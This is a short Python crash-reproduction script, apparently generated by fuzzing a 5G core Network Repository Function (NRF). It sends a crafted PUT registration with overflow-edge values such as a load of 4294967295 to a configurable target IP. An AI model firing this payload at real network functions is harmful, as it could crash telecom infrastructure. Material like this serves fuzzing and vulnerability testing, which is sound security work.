#!/usr/bin/env python3
# Crash reproduction for nrf (low)
# Detected: Sat May  9 05:00:56 2026
import http.client, json

host, port = '127.0.0.1', 80  # Update to target IP
method = 'PUT'
path = '/nnrf-nfm/v1/nf-instances/NRF-fuzz-1936'
body = b'{"nfInstanceId": "AMF-instance-001", "nfType": "AMF", "nfStatus": "REGISTERED", "ipv4Addresses": ["172.25.0.20"], "fqdn": "amf.oai.local", "priority": 32768, "capacity": 32767, "load": 4294967295, "nfServices": [{"serviceInstanceId": "namf-comm-001", "serviceName": "namf-comm", "versions": [{"apiVersionInUri": "v1", "apiFullVersion": "1.0.0"}], "scheme": "http", "nfServiceStatus": "REGISTERED", "ipEndPoints": [{"ipv4Address": "172.25.0.20", "port": 8080}]}]}'
conn = http.client.HTTPConnection(host, port, timeout=10)
headers = {'Content-Type': 'application/json'}
if body:
    conn.request(method, path, body=body, headers=headers)
else:
    conn.request(method, path, headers=headers)
resp = conn.getresponse()
print(f'Status: {resp.status}')
print(f'Body: {resp.read()[:500]}')
